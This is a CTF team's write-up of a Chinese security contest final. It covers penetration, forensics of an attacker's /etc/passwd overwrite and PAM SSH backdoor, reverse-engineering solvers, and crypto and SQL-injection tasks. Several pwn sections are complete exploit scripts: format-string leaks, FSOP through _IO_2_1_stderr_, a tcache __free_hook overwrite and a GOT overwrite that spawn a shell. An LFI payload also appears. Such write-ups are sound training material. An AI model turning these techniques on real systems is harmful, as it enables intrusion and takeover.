# 第一届“长城杯”信息安全铁人三项赛线下决赛- WriteUp

> 原文: https://www.ctfiot.com/183955.html
> ID: 183955

EDI

JOIN US ▶▶▶

招新

EDI安全的CTF战队经常参与各大CTF比赛，了解CTF赛事。

欢迎各位师傅加入EDI，大家一起打CTF，一起进步。（诚招re crypto pwn 方向的师傅）有意向的师傅请联系邮箱root@edisec.net、shiyi@edisec.net（带上自己的简历，简历内容包括但不限于就读学校、个人ID、擅长技术方向、历史参与比赛成绩等等。

点击蓝字 ·  关注我们

01

企业环境渗透

1

题目

获取的flag

flag1{9a0fe27c8bcc9aad51eda55e1b735eb5}flag2{5399019c4053e1a5e756522fe94cdefe}flag3{21db4fb5e7cd1d14f041436c4f50ce8c}flag4{efba34b4991857a0c3639a0a31424041}flag5{a40310f194e1abfec9581d026e29832c}flag6{bf2bbf3cf5bf7fa02fcfd1f649a03a78}flag7{cb8650fe07e6f4da7d9f1817b82eb019}flag8{912ec803b2ce49e4a541068d495ab570}flag9{ab67b0ec5c2d29c248e3aa9c7d31d620}flag12{76e24b847fdf0208195fffba98731234}flag14{8f552743a81f9bc517a35a5421e76764}

2

202.0.6.195

3

202.0.6.194

http://202.0.6.194:8080/index.php?file=php://filter/read=convert.base64-encode/resource=flag.php

‍

4

202.0.6.193

端口扫描：

PORT STATE SERVICE
22/tcp   open ssh
80/tcp   open http
3306/tcp open  mysql
3389/tcp open  ms-wbt-server

80：

02

取证溯源

1

题目

您的同事李白在运维一台部署了移动应用服务端的linux服务器时发现了异常，好像被黑客攻击了。小李通过简单分析，发现可能是由于公司的移动应用和其服务端程序都存在安全问题导致的。小李将当天可能与攻击相关的流量导出，并与移动应用一起打包压缩，你可以下载分析，也可以登录此服务器进行攻击溯源、排查等，提供了SSH和VNC访问的方式供您和您的团队进行分析取证。

•用户名：root

•密码：Szivfn4bLZ

•虚机IP：202.0.5.236

•data2024.zip

2

关卡1

关卡描述：黑客攻击此服务器所使用的2个IP分别是什么（ascii码从小到大排列，空格分隔）

202.1.1.1202.1.1.129

3

关卡2

关卡描述：存在安全问题的apk中使用的登录密码是什么?‍

password663399

4

关卡3

关卡描述：黑客尝试上传一个文件但显示无上传权限的文件名是什么？

‍上传文件

pic.jpg

5

关卡4

http://202.1.1.66:8080/api/upload

6

关卡5

/usr/local/tomcat/webapps/ROOT/static/s74e7vwmzs21d5x6.jsp

7

关卡6

bing_pass

8

关卡7

pwd

9

关卡8

tomcat

10

关卡9

CentOS Linux release 7.4.1708 (Core)

11

关卡10

/usr/local/tomcat/webapps/ROOT/static/secert.file

12

关卡11

tcp.stream eq 284

cat /etc/passwd

13

关卡12

/etc/passwd

14

关卡13

关卡描述：黑客设置的root密码是多少？

echo WLpoAWLex8nkqQ5WLpoAWLex8nkqQ5
cat /etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinavahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinpolkitd:x:999:998:User for polkitd:/:/sbin/nologintss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinsystemd-network:x:192:192:systemd Network Management:/:/sbin/nologingeoclue:x:998:996:User for geoclue:/var/lib/geoclue:/sbin/nologinrtkit:x:172:172:RealtimeKit:/proc:/sbin/nologincolord:x:997:995:User for colord:/var/lib/colord:/sbin/nologinpulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologingdm:x:42:42::/var/lib/gdm:/sbin/nologinchrony:x:996:992::/var/lib/chrony:/sbin/nologintomcat:x:1000:1000::/home/tomcat:/bin/bashecho -e "root:$6$KHysqjWMnoaHJ4QW$p1cMTekiYb/6xA2u7j4jAD3m5shTPlPAtM6jyoex73MxxHXlms4X0874ml/gw6.LETsMs5oXLWyGeSAddx2N..:0:0:root:/root:/bin/bashnbin:x:1:1:bin:/bin:/sbin/nologinndaemon:x:2:2:daemon:/sbin:/sbin/nologinnadm:x:3:4:adm:/var/adm:/sbin/nologinnlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinnsync:x:5:0:sync:/sbin:/bin/syncnshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownnhalt:x:7:0:halt:/sbin:/sbin/haltnmail:x:8:12:mail:/var/spool/mail:/sbin/nologinnoperator:x:11:0:operator:/root:/sbin/nologinngames:x:12:100:games:/usr/games:/sbin/nologinnftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnnobody:x:99:99:Nobody:/:/sbin/nologinnavahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologinndbus:x:81:81:System message bus:/:/sbin/nologinnpolkitd:x:999:998:User for polkitd:/:/sbin/nologinntss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologinnpostfix:x:89:89::/var/spool/postfix:/sbin/nologinnsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinnsystemd-network:x:192:192:systemd Network Management:/:/sbin/nologinngeoclue:x:998:996:User for geoclue:/var/lib/geoclue:/sbin/nologinnrtkit:x:172:172:RealtimeKit:/proc:/sbin/nologinncolord:x:997:995:User for colord:/var/lib/colord:/sbin/nologinnpulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologinngdm:x:42:42::/var/lib/gdm:/sbin/nologinnchrony:x:996:992::/var/lib/chrony:/sbin/nologinntomcat:x:1000:1000::/home/tomcat:/bin/bashn" > /etc/passwdcat /etc/passwdroot:$6$KHysqjWMnoaHJ4QW$p1cMTekiYb/6xA2u7j4jAD3m5shTPlPAtM6jyoex73MxxHXlms4X0874ml/gw6.LETsMs5oXLWyGeSAddx2N..:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinavahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinpolkitd:x:999:998:User for polkitd:/:/sbin/nologintss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinsystemd-network:x:192:192:systemd Network Management:/:/sbin/nologingeoclue:x:998:996:User for geoclue:/var/lib/geoclue:/sbin/nologinrtkit:x:172:172:RealtimeKit:/proc:/sbin/nologincolord:x:997:995:User for colord:/var/lib/colord:/sbin/nologinpulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologingdm:x:42:42::/var/lib/gdm:/sbin/nologinchrony:x:996:992::/var/lib/chrony:/sbin/nologintomcat:x:1000:1000::/home/tomcat:/bin/bash

123456

15

关卡14

202.1.1.129:9999

16

关卡15

rpm -qa | grep pam

17

关卡16

pam_unix.so

18

关卡17

ssh_back_pwd

19

关卡18

/tmp/.sshlog

03

夺旗闯关

1

crazyaes（re by 武汉大学国家网络安全学院）

用010editor打开程序发现PE头的P被损坏了，修复即可。

#include <iostream>#include "aes.hpp"int main() { unsigned char answer[]{ 0x1E, 0xF6, 0xB9, 0xF8, 0xB4, 0x94, 0x94, 0x34, 0x04, 0xFD,0xC9, 0xEF, 0x05, 0xAE, 0x85, 0xD9 }; answer[0] = 0xB4; answer[1] = 0x38; answer[2] = 0x36; answer[3] = 0x30; answer[4] = 0x1E; answer[5] = 0x68; answer[6] = 0x48; answer[7] = 0x57; answer[8] = 0x51; answer[9] = 0x01; answer[10] = 0xB7; answer[11] = 0x03; answer[12] = 0x9B; answer[13] = 0x98; answer[14] = 0xE3; answer[15] = 0x7E; AES_ctx ctx; unsigned char key[] = "gah43jJKgfjGMeAR"; AES_init_ctx(&ctx, key); AES_ECB_decrypt(&ctx, answer); for (int i = 0; i < 16; ++i) printf("%02X ", answer[i]); printf("n"); for (int i = 0; i < 16; ++i) printf("%c", answer[i]); printf("n");}

flag{Re_1ts_f0n}

2

puzzle（re by 武汉大学国家网络安全学院）

struct list_struct{ unsigned __int8 data; list_struct *next;};

#include <iostream>#include <string>int ch2num(int ch){ return ch ^ 0x8D;}std::string final;//// aaa aaabchar record[0x100] = { 0 };int index = 0;bool done = false;void solve(int x, char ch){ // start from 1, can n * 2 or (n - 1) / 3, need to get x // 564 ab in total if (done)return; record[index++] = ch; if (x == 1) { for (int i = index; i > 0; --i) final.push_back(record[i]); final.push_back('-'); done = true; return; } if (x % 2 == 0) { solve(x / 2, 'a'); solve(x * 3 + 1, 'b'); } else { solve(x * 3 + 1, 'b'); } --index; }int main() { char answer[] = "ISCC2024"; int table[8]; for (int i = 0; i < 8; ++i) table[i] = ch2num(answer[i]) - (7 - i); for (int i = 0; i < 8; ++i) std::cout << table[i] << std::endl; for (int i = 7; i >= 0; --i) { std::memset(record, 0, sizeof(record)); index = 0; done = false; solve(table[i], 0); } final.pop_back(); std::cout << final << std::endl;}/*aaaabaaabaababaaababaaaababaababaaabaababaab-aaaabaaaaabababaaabaaaabaabaabaaaababababaaababababababaababaabababaaabaababababaabababaababaaaabababababa-aaaabaaabaababaaababaaaabaaabababaaababaabab-aaaabaaaaabababaaabaaaabaabaabaaaababababaaababababababaababaabababaaabaababababaabababaababaabaababababaa-aaaabaaabaababaaababaaaaba-aaaaaaaaaabababaab-aaaabaaaaabababaaabaaaabaabaabaaaababababaaababababababaababaabababaaabaababababaabababaababaabaabababababaababaaa-aaaabaaaaabababaaabaaaabaabaabaaaababababaaababababababaababaabababaaabaababababaabababaababaabaabababaaab

3

mapmap（re by 武汉大学国家网络安全学院）

import subprocessdef test_opt(data): return subprocess.run( "/mnt/d/CTF_Exercise/2024ccbfinal/mapmap/mapmap_p", executable="/mnt/d/CTF_Exercise/2024ccbfinal/mapmap/mapmap_p", input=data.encode(), capture_output=True).stdoutdef is_wrong(output): if b'false' in output: return True else: return Falsedef get_enums(inp): if (len(inp) == 0): return ['w', 'a', 's', 'd'] last_c = inp[-1] if last_c == 'w': return ['w', 'a', 'd'] elif last_c == 'a': return ['w', 'a', 's'] elif last_c == 's': return ['a', 's', 'd'] elif last_c == 'd': return ['w', 's', 'd']ans = ''x=0y=0vis = []for i in range(39): vis.append([0] * 39)def check_ans(answ): x=0 y=0 for ch in answ: if ch == 'w': y=y-1 elif ch == 'a': x=x-1 elif ch == 's': y=y+1 elif ch == 'd': x=x+1 return (x, y)def dfs(depth): global vis global x global y global ans if depth == 140: if x == 38 and y == 38: print(ans) exit(1) return enums = get_enums(ans) for d in enums: nx = x ny = y if d == 'w': ny = ny - 1 elif d == 'a': nx = nx - 1 elif d == 's': ny = ny + 1 elif d == 'd': nx = nx + 1 if nx < 0 or nx > 38 or ny < 0 or ny > 38: continue if vis[nx][ny] == 1: continue ans += d outp = test_opt(ans) if is_wrong(outp) == False: oldx = x oldy = y vis[nx][ny] = 1 x = nx y = ny dfs(depth + 1) x = oldx y = oldy vis[nx][ny] = 0 ans = ans[:-1]vis[0][0] = 1dfs(0)

故flag为 flag{f205f28a97000b7a21a5df3f9264d796}

4

power_system（pwn）

•先绕过 sha256 的判断，这里有00 截断，所以只需要保证前面三个字节一样即可，然后 print输出pwd, 存在格式化字符串漏洞

import hashlibpwd = 'e85000'for i1 in range(1,0x100): for i2 in range(0, 0x100): for i3 in range(0, 0x100): m = b'-%p-%p-%p-%p'+ bytes([i1,i2,i3]).replace(b'x00',b'') rel = hashlib.sha256(m).hexdigest() if rel[:6] == pwd: print(m,rel) input('>>')                exit(0)

•负向越界写 修改 _IO_2_1_stderr_ 结构体

from pwn import *import syss = lambda data :io.send(data)sa = lambda delim,data :io.sendafter(str(delim), data)sl = lambda data :io.sendline(data)sla = lambda delim,data :io.sendlineafter(str(delim), data)r = lambda num :io.recv(num)ru = lambda delims, drop=True :io.recvuntil(delims, drop)rl = lambda :io.recvline()itr = lambda :io.interactive()uu32 = lambda data :u32(data.ljust(4,b'x00'))uu64 = lambda data :u64(data.ljust(8,b'x00'))ls = lambda data :log.success(data)lss = lambda s :log.success(' 33[1;31;40m%s --> 0x%x  33[0m' % (s, eval(s)))
context.arch = 'amd64'context.log_level = 'debug'context.terminal = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw): '''Start the exploit against the target.''' if args.GDB: return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw) elif args.RE: return remote('202.0.5.76', 7777) elif args.AWD: # python3 exp.py AWD 1.1.1.1 PORT IP = str(sys.argv[1]) PORT = int(sys.argv[2]) return remote(IP,PORT) else: return process([binary] + argv, *a, **kw)

binary = './pwn'libelf = ''
if (binary!=''): elf = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)
gdbscript = '''#brva 0x01DE1#brva 0x01F96b *_IO_wfile_seekoff#continue'''.format(**locals())

io = start(binary)

def login(pwd): ru('>> ') sl('2') ru('account : ') sl('QAQ') ru('password : ') sl(pwd)
def adjust(idx,size,text): ru('>> ') sl('2') ru('power: ') sl(str(idx)) ru('size: ') sl(str(size)) ru('staff: ') sl(text)
pwd = b'%p x19xe2'pwd = b'-%p-%p-%p-x8cxb5x08'pwd = b'-%p-%p-%p-%pxc0Rxb9'login(pwd)ru('-0x22-')libc_base = int(ru('xc0'),16) - 2016704 + 0x80#libc_base = int(ru('xc0'),16) - 0lss('libc_base')#exit(0)lss('libc_base')libc.address = libc_base
pay = flat({ 0x00: 0, 0x28: 0xffffffff, 0x30: 1, 0x70: b'/bin/sh', 0x90: libc.sym['system'], 0x98: libc.sym['_IO_2_1_stderr_']+0x70, 0xa0: libc.sym['_IO_2_1_stderr_'], 0xd8: libc.symbols['_IO_wfile_jumps'] + 0x30, # vtable # 可以控制虚表的走向 0xe0: 0}, filler=b"x00")
#gdb.attach(io,gdbscript)adjust(-2,0,pay[8:])ru('>> ')sl('4')sl(p64(0x31))itr()

5

numberGame（pwn）

./gdbserver :1234 php -S 0:8080

<?php
$heap_base = 0;$libc_base = 0;$libc = "";$mbase = "";
function u64($leak){ $leak = strrev($leak); $leak = bin2hex($leak); $leak = hexdec($leak); return $leak;}
function p64($addr){ $addr = dechex($addr); $addr = hex2bin($addr); $addr = strrev($addr); $addr = str_pad($addr, 8, "x00"); return $addr;}
function leakaddr($buffer){ global $libc, $mbase; $p = '/([0-9a-f]+)-[0-9a-f]+ .* /usr/lib/x86_64-linux-gnu/libc.so.6/'; $p1 = '/([0-9a-f]+)-[0-9a-f]+ .* /usr/local/lib/php/extensions/no-debug-non-zts-20230831/numberGame.so/'; preg_match_all($p, $buffer, $libc); preg_match_all($p1, $buffer, $mbase); return "";}

ob_start("leakaddr");include("/proc/self/maps");$buffer = ob_get_contents();ob_end_flush();leakaddr($buffer);

echo "n----1-----n";add_chunk(5,[0,0,0,0x80000000,0],"test1"); #需要构造好#add_chunk(1,[0],"/bin/sh;");add_chunk(1,[0],"/bin/sh");$rel = show_chunk(0); # vlun 会把数组控制的范围增大，然后 越界修改和泄露其他地方的值
$heap = $rel[7];$heap += ($rel[8] << 0x20);
$of = $heap - 72; # 数组起始#$str_got = hexdec($mbase[1][0])+ 0x4008;##echo "n----heap-----n";echo dechex($heap);echo "n----4-----n";echo $libc[1][0];echo "n----4-----n";#$offset = ($str_got - $of) / 4;$system = (hexdec($libc[1][0]) + 0x4c490);echo $offset;edit_chunk(0,$offset,$system & 0xffffffff); # 修改strlen_got表低四字节为 systemedit_name(1,'1'); # ?>

6

BlindFlowanalyis（misc）

Web服务器被人攻击了，我RSA加密的敏感信息竟然也被盗走了。幸好黑客闯入的这个是我的蜜罐，即使解密了也还好吧。所幸我捕获了所有的流量，帮我分析一下攻击者的攻击手法吧，看拿走了我的什么东西？

from Crypto.PublicKey import RSAimport libnumimport gmpy2# with open("private.pem", "rb") as f:# key = RSA.import_key(f.read())# print("n = %d" % key.n)# print("e = %d" % key.e)# print("d = %d" % key.d)# print("p = %d" % key.p)# print("q = %d" % key.q)

# strs = "MTTC3TBXBgkqhkiG9w0BBQ0wSjApBgkqhkiG9w0BBQwwHAQIVLQmLXnlUYkCAggAMAwGCCqGSIb3DQIJBQAwHQYJYIZIAWUDBAEqBBBCQKgOObf2BrhJ9tHvAb4oBIICgP3WaNdtO3oTAX1GjdqBL0f6HvFZ9q25EIOAah78rfhKNrJQP0uHHUnbIDKUZTSMwNZ7kNQAAnJPdjwhZVNbymCjUrVvqs0VD8GWncUlIIxrAkpsgqioABSKLoy280ubg2s1IV/sqbuuvN4ldPvnAvyrLLnNLgGyU86v2Q1ArFWfG4kgeZSpW06W6TwgeIZbjRSnLKFXx1VEhpZSCOadg/HOh8BfLbFlZiWgDiuTdVSzGq34fLV8jKYfUjhEffh/tCNhjU5E8M6ItqgXZYyjbBO2ujewBzV1JiBE0QvcavwT8JvV2IDQXBtQmBJZXH4Vqoo2n5YmUgUFDxoZSdAqOfh5kcgO0OgORhOrX/qNisaDfBMwGx2csywJBuSujzZ3ckV3Gv2ysMzRPKfyZ/v10zElsrKZHci2wDMZ4XYqNyvPDafWaxkSNXP64eYRS8J6WVgWycaPq0LkoJnuxtmOnlYlZ8cmY2zOf4WfyG7X+NhK6CllS0or2Y7fuqo80dmGTrg7cuVA1GguRMA6qZAOlbqu8zT53vGUOIHDRQFb8DUU5H6t+I3e0+0Qj8ZwgTtUMCx2/WLc0YAq18Al9okrtsxuYIQ815SSxXKOXZsX93hACLEFFkKOW7vNdBMJdVJnbPoaMotkDYtH/d8TYPrrtyOhPRa/Xl8BzA9J40Z3PE+5XaQfTC4Wx9GMb3y/Dv1lVXrAd9XvCPD8jr6tu+aQWpMAq0uLpF0kgyS/5FDfIpiEHMMuRQ+FBKS58HWVkX1yKNmXkljJRpwe53AHLuDgt+0LNhry+5ck2GFH7bkxU13WmotrtUtnSdIX7FZrQzbJmbwHiyMi7oGdKT7vxkr3aFY="# for i in range(0,len(strs),64):# print(strs[i:i+64])
# from Crypto.PublicKey import RSA## # 读取加密的私钥文件# file_in = open("private.pem", "rb")# encrypted_key = file_in.read()# file_in.close()## # 密码爆破函数# def passphrase_cracker():# # 读取密码字典文件# with open("pass.txt", "r",encoding="utf-8") as file:# passwords = file.readlines()## # 尝试每个密码# for password in passwords:# passphrase = password.strip()# try:# key = RSA.import_key(encrypted_key, passphrase=passphrase)# print(f"Passphrase cracked: {passphrase}")# print("n = %d" % key.n)# print("e = %d" % key.e)# print("d = %d" % key.d)# print("p = %d" % key.p)# print("q = %d" % key.q)# break # 如果找到正确的密码，停止循环# except ValueError:# continue### # 调用密码爆破函数# passphrase_cracker()
n = 136024092362152689710172713899392826085562613819502637163574709012959800908069097569347489959246188000879909455954675900898187256462694001680199507890264369748020986792003039927832146357618380320485640247974651461597017754521523478582789651823653650205470697891883134131193787384293246455773119816555908050877e = 65537d = 96983349311172448114610684077344531859866705158061854017461211652174689366790434748659538326833645524163686606777761277160529104669611099325734812475218305914063705028257975357368955813173682894994622796568980398528404622799756620123598161913849740935593865664141149764560174893499019267153779766584891066853p = 12048894621399454101058574170146672880023504304935502855438830209547540828334463319100866266089541071671086068945870668091434002554455832672446379382564831q = 11289342021513486663717934560260253958877903230700176094000844663541917077757746704211638621740652499799934180688739478331856827700031454191788549757111267
c = "MDgnetOpihRoTmbreC2P7EQqkmeHloAWQ0SA2gKuHWPUP3u8u81ewsTnlyhvc7qLMMpVl36M9Z0Hu++yIKt2C/mimOFH04ixQAUo5y8h8vajw7vRLwfhpxC+pSjWvxjP2ieWVgdmXraijq92K6vdXod/SVaOyBT/1/asqhq1abQ="
import base64
c = base64.b64decode(c.encode())c = libnum.s2n(c)
phi = (p-1)*(q-1)d = gmpy2.invert(e,phi)m = pow(c,d,n)print(libnum.n2s(int(m)))

flag{182w3t-he5dr4y8g-gy590-gggtd46nd-dgw3456utg676}

7

kernel（re）

一次简单的sys逆向。

kernel.zip

#include<stdio.h>void xtea_encryt(unsigned int rb, unsigned int *buf, int *key){ unsigned int v3; // [rsp+0h] [rbp-28h] unsigned int v4; // [rsp+4h] [rbp-24h] unsigned int v5; // [rsp+8h] [rbp-20h] unsigned int i; // [rsp+Ch] [rbp-1Ch]
 v4 = *buf; v5 = buf[1]; v3 = 0; for ( i = 0; i < rb; ++i ) { v4 += (key[v3 & 3] + v3) ^ (v5 + ((v5 >> 6) ^ (4 * v5))); v3 -= 1640951535; v5 += (key[(v3 >> 11) & 3] + v3) ^ (v4 + ((v4 >> 6) ^ (8 * v4))); } *buf = v4; buf[1] = v5;}
void xtea_decrypt(unsigned int rb, unsigned int *buf, int *key){ unsigned int v3; // [rsp+0h] [rbp-28h] unsigned int v4; // [rsp+4h] [rbp-24h] unsigned int v5; // [rsp+8h] [rbp-20h] unsigned int i; // [rsp+Ch] [rbp-1Ch]
 v4 = *buf; v5 = buf[1]; v3 = (0x100000000 - 1640951535) * rb; for ( i = 0; i < rb; ++i ) { v5 -= (key[(v3 >> 11) & 3] + v3) ^ (v4 + ((v4 >> 6) ^ (8 * v4))); v3 += 1640951535; v4 -= (key[v3 & 3] + v3) ^ (v5 + ((v5 >> 6) ^ (4 * v5))); } *buf = v4; buf[1] = v5;}

int main(){ int key[4]; key[0] = 0x1234; key[1] = 0x3A4D; key[2] = 0x5E6F; key[3] = 0xAA33; unsigned int tmp[2]; unsigned int flag[] = {0x8CCAF011, 0x835A03B8, 0x6DCC9BAD, 0xE671FA99, 0xE6011F35, 0xE5A56CC8, 0xD4847CFA, 0x5D8E0B8E}; for(int i=0;i<8;i+=2){ tmp[0] = flag[i]; tmp[1] = flag[i+1]; xtea_decrypt(33,tmp,key); flag[i] = tmp[0]; flag[i+1] = tmp[1]; } printf("%sn",&flag[0]);}

flag{xLi1SSQzRzYw3MfHOPeJkACm4m}

8

Old_man_v1（pwn）

from pwn import *import syss = lambda data :io.send(data)sa = lambda delim,data :io.sendafter(str(delim), data)sl = lambda data :io.sendline(data)sla = lambda delim,data :io.sendlineafter(str(delim), data)r = lambda num :io.recv(num)ru = lambda delims, drop=True :io.recvuntil(delims, drop)rl = lambda :io.recvline()itr = lambda :io.interactive()uu32 = lambda data :u32(data.ljust(4,b'x00'))uu64 = lambda data :u64(data.ljust(8,b'x00'))ls = lambda data :log.success(data)

#io = process('./Old_man_v1')#io = remote('202.0.5.60',9999)libc = ELF('./libc-2.27.so')def add(idx,size,text='A'): ru(' neededn') sl('1') ru('add?n') sl(str(idx)) ru('include?:n') sl(str(size)) ru('about:n') s(text)
def edit(idx,text): ru(' neededn') sl('3') ru('edit?n') sl(str(idx)) ru('about:n') s(text)def show(idx): ru(' neededn') sl('2') ru('show?n') sl(str(idx))def rm(idx): ru(' neededn') sl('4') ru('delete?n') sl(str(idx))

add(0,0x600)add(1,0x28)add(2,0x28)rm(0)show(0)libc_base = u64(r(8)) - 4111520system = libc_base + libc.sym['system']free_hook = libc_base + libc.sym['__free_hook']
rm(1)rm(2)
edit(2,p64(free_hook))
add(3,0x28,'/bin/sh;')add(4,0x28,p64(system))rm(3)
itr()

flag{c7e41125a9e433dd894dc1e427b61d82}

9

SandBoxShell（pwn）

注意:题目端口8888 SandBoxShell。

SandBoxShell.zip

from pwn import *import syss = lambda data :io.send(data)sa = lambda delim,data :io.sendafter(str(delim), data)sl = lambda data :io.sendline(data)sla = lambda delim,data :io.sendlineafter(str(delim), data)r = lambda num :io.recv(num)ru = lambda delims, drop=True :io.recvuntil(delims, drop)rl = lambda :io.recvline()itr = lambda :io.interactive()uu32 = lambda data :u32(data.ljust(4,b'x00'))uu64 = lambda data :u64(data.ljust(8,b'x00'))ls = lambda data :log.success(data)lss = lambda s :log.success(' 33[1;31;40m%s --> 0x%x  33[0m' % (s, eval(s)))
context.arch = 'amd64'context.log_level = 'debug'context.terminal = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw): '''Start the exploit against the target.''' if args.GDB: return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw) elif args.RE: return remote('202.0.5.76',8888) elif args.AWD: # python3 exp.py AWD 1.1.1.1 PORT IP = str(sys.argv[1]) PORT = int(sys.argv[2]) return remote(IP,PORT) else: return process([binary] + argv, *a, **kw)

binary = './SandBoxShell'libelf = ''
if (binary!=''): elf = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)
gdbscript = '''
#continue'''.format(**locals())
io = start(binary)
pay = asm(shellcraft.cat('/flag'))sl(pay) #gdb.attach(io,gdbscript)itr()

flag{b7a725b76dfef7aef18066b3a7c54df4}

10

Zip_guessinteger（misc）

写入文件

然后明文攻击

flag{ea4c4090-a512-47ed-a817-8771e1640a63}

11

aesweblog（misc）

共有6个flag，但是这里只要flag1+flag6两个，且flag是以倒叙存放在secrets表（密钥）和user_flag表（密文）

所以我们需要获取secrets表的倒数第一行

（SELECT COALESCE(passphrase,CHAR(32)) FROM secrets LIMIT 23,1）

和倒数第6行

（SELECT COALESCE(passphrase,CHAR(32)) FROM secrets LIMIT 18,1）

还要获取user_flag表的倒数第一行

（SELECT COALESCE(flagvalue,CHAR(32)) FROM user_flag LIMIT 23,1）

和倒数第6行

（SELECT COALESCE(flagvalue,CHAR(32)) FROM user_flag LIMIT 18,1）

提取值脚本

import pprintimport redata = {}with open("./2.txt","r") as f: for i in f.readlines(): try: res = i.split(" ")[15:16][0] res2 = res.strip().split(">") prex = res2[0] hz = res2[1] data[prex] = hz data.update(data) except: pass

# pprint.pprint(data)
for v in data.values(): num = int(re.findall(r"((.*?))",v)[0]) print(chr(num),end='') # print(num,"=",chr(num))
# dict1 = {'a': 1, 'b': 2}# dict2 = {'b': 3, 'c': 4}## dict1.update(dict2)# print(dict1) # 输出: {'a': 1, 'b': 3, 'c': 4}
解密脚本
import sqlite3import osimport randomimport base64from Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad import hashlib 
def md5_hash(input_rawstring): # 创建一个md5 hash对象 m = hashlib.md5() # 更新hash对象 m.update(input_rawstring) # 获取散列值的16进制字符串表示（32个字节长度） hexdigest = m.hexdigest() #将16进制字符串转换为16字节的字节串 byte_digest = bytes.fromhex(hexdigest) return byte_digest #return (hex_dig)
def genpassphrase(username,number): passphrase = "" accvalue = 0 # 这里省略了计算随机数种子的部分代码。其余代码都是okay的。
 random.seed(accvalue) total = random.randint(4,7) for i in range(total): str4bytes = base64.b64encode(os.urandom(3)) passphrase = passphrase + str4bytes.decode("utf-8") return passphrase

# 迭代次数，增加这个值会提高安全性，但也会降低性能 iterations = 10000 # 密钥长度（可以是16、24或32字节，对应AES-128、AES-192或AES-256） key_length = 16 # 简化版的PBKDF2实现，这里仅使用HMAC-SHA256作为伪随机函数 def pbkdf2(passphrase, salt, iterations, key_length): h = hashlib.sha256() u = passphrase.encode("utf-8") + salt for _ in range(iterations): h.update(u) u = h.digest() return h.digest()[:key_length] 

passphrase = "TJOC6+L+vTajLOGqfJMweoLFZqvJ"# AES加密用的salt从passphrase派生salt = md5_hash(passphrase.encode("utf-8") + b"saltseed")# 使用passphrase和salt通过PBKDF2派生密钥key = pbkdf2(passphrase, salt, iterations, key_length)# 初始化向量也从passphrase派生iv = md5_hash(passphrase.encode("utf-8") + b"IVseed") 
# 创建Cipher对象cipher = AES.new(key, AES.MODE_CBC, iv) 
# 需要加密的数据encrypted_flagdata_b64 = "PgH8ySWqsB1IJEradvOouNWEP5mpHZnu5e9ShkiS1LWLb81hRUjAZLD4zzzxO5Tn"
# 对数据进行填充，以符合AES的块大小（128位/16字节）# padded_flagdata = pad(original_flagdata, AES.block_size) 
# # 加密数据 # encrypted_flagdata = cipher.encrypt(padded_flagdata)
# 使用相同的salt和passphrase通过PBKDF2派生密钥 key_decrypt = pbkdf2(passphrase, salt, iterations, key_length) 
# 创建解密器对象 decipher = AES.new(key_decrypt, AES.MODE_CBC, iv) 
encrypted_flagdata = base64.b64decode(encrypted_flagdata_b64)
# 解密数据 decrypted_padded_data = decipher.decrypt(encrypted_flagdata) 
# 解密数据 
# 去除填充 decrypted_flagdata = unpad(decrypted_padded_data, AES.block_size)#decrypted_flagdatastr = decrypted_flagdata.decode("utf-8")# if original_flagdata == decrypted_flagdata:# print(f"rn congrutulations: {original_flagdata} matchs {decrypted_flagdata}rn") print(decrypted_flagdata)flagvalue = base64.b64encode(encrypted_flagdata)
base64flagdata = flagvalue.decode("utf-8")notestr = "encrypted with aes128. associated key, iv & salt are derived from passphrase."
